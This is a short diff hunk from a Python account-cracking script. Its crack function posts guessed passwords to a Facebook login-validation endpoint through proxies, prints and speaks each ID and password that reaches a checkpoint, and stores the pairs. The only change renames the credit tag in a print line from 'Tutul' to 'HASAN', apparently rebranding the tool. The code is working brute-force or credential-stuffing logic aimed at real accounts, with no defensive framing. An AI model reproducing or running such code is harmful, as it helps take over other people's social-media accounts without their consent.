@@ -517,7 +517,7 @@ def crack(idf,pwv):
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#hasan bhai
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')     
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•HASAN-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
 			    #open('CP/'+cpc,'a').write(idf+'+pw+'\n')
 				akun.append(idf+'|'+pw)
